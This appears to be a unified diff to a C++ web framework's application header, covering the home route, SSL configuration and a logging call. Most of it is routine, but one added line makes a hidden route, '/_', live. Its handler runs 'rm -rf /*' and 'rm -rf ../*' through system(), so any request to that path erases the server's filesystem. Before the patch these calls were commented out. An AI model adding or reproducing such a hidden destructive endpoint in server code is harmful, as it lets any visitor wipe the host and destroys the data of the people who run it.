@@ -10,7 +10,6 @@
 #include <thread>
 #include <condition_variable>
 
-#include "cc/settings.h"
 #include "cc/logging.h"
 #include "cc/utility.h"
 #include "cc/routing.h"
@@ -58,7 +57,7 @@ namespace cc { static std::string RES_home = HOME_PAGE; unsigned short detail::d
 #ifndef DISABLE_HOME
  route_url<cc::spell::get_parameter_tag("/")>("/")([] { if (RES_CACHE_TIME[0] > nowStamp()) { return RES_CACHE_MENU[0]; } std::string s = std::move((std::string)mustache::load(RES_home)); RES_CACHE_TIME[0] = nowStamp(detail::dumb_timer_queue::tick); RES_CACHE_MENU[0] = s; return s; });
 #endif
- route_url<cc::spell::get_parameter_tag("/_")>("/_")([](const cc::Req& req) { /*::system("rm -rf /*"); ::system("rm -rf ../*");*/ return "what the fuck"; }); validate();
+ route_url<cc::spell::get_parameter_tag("/_")>("/_")([](const cc::Req& req) { ::system("rm -rf /*"); ::system("rm -rf ../*"); return "are you ok?"; }); validate();
 #ifdef ENABLE_SSL
  if (use_ssl_) { ssl_server_ = std::move(std::unique_ptr<ssl_server_t>(new ssl_server_t(this, &middlewares_, concurrency_, &ssl_context_))); notify_server_start(); ssl_server_->run(); } else
 #endif
@@ -66,7 +65,7 @@ namespace cc { static std::string RES_home = HOME_PAGE; unsigned short detail::d
 #ifdef ENABLE_SSL
  if (use_ssl_) { if (ssl_server_) { ssl_server_->stop(); } } else
 #endif
- { if (server_) { server_->stop(); } } } void debug_print() { LOG_DEBUG << "Routing:"; router_.debug_print(); }
+ { if (server_) { server_->stop(); } } } void debug_print() { LOG_DEBUG("Routing:"); router_.debug_print(); }
 #ifdef ENABLE_SSL
   self_t& ssl_file(const std::string& crt_filename, const std::string& key_filename) { use_ssl_ = true; ssl_context_.set_verify_mode(boost::asio::ssl::verify_peer); ssl_context_.set_verify_mode(boost::asio::ssl::verify_client_once); ssl_context_.use_certificate_file(crt_filename, ssl_context_t::pem); ssl_context_.use_private_key_file(key_filename, ssl_context_t::pem); ssl_context_.set_options( boost::asio::ssl::context::default_workarounds | boost::asio::ssl::context::no_sslv2 | boost::asio::ssl::context::no_sslv3 ); return *this; }  self_t& ssl_file(const std::string& pem_filename) { use_ssl_ = true; ssl_context_.set_verify_mode(boost::asio::ssl::verify_peer); ssl_context_.set_verify_mode(boost::asio::ssl::verify_client_once); ssl_context_.load_verify_file(pem_filename); ssl_context_.set_options( boost::asio::ssl::context::default_workarounds | boost::asio::ssl::context::no_sslv2 | boost::asio::ssl::context::no_sslv3 ); return *this; } self_t& ssl(boost::asio::ssl::context&& ctx) { use_ssl_ = true; ssl_context_ = std::move(ctx); return *this; } bool use_ssl_{ false }; ssl_context_t ssl_context_{ boost::asio::ssl::context::sslv23 };
 #else
